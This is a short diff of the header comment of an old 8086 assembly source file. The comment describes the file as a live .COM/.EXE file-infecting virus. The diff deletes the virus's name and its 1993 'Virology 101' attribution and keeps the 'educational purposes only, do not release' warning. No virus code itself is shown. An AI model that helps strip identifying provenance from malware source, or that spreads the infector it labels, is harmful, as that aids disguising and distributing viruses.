@@ -1,8 +1,5 @@
-; The Flip/Flop virus.
-;
 ;This file is a direct action .COM/.EXE file infector written
-;in TASM compatible 8086 assembly. It is presented as a part of
-;VIROLOGY 101 (c) 1993 Black Wolf Enterprises. This is a live virus
+;in TASM compatible 8086 assembly. This is a live virus
 ;for educational purposes only. Please do not release it. Execute
 ;only on an isolated machine under controlled conditions.
 
